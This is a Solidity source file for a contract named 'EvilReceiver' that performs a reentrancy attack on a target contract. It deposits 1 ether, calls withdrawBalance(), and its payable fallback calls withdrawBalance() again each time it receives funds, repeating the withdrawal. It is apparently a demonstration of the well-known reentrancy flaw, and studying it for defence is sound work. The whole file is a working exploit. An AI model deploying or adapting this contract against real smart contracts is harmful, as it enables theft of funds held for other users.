pragma solidity ^0.4.11;
contract EvilReceiver {
    
    address public target;
    
    event MessageLog(string);
    
    event BalanceLog(uint);
    
    function EvilReceiver(address _target){
        target = _target;
    }
    
    function() payable{
        BalanceLog(this.balance);
        
        if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))){
            MessageLog("Fail");
        }else{
            MessageLog("SUCCESS");
        }
    }
    
    function addBalance() public payable{
        
    }
    
    function sendEthToTarget() public {
        if(!target.call.value(1 ether)(bytes4(sha3("addToBalance()")))){ throw; }
    }
    
    function withdraw() public {
        if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))) {throw;}
    }
}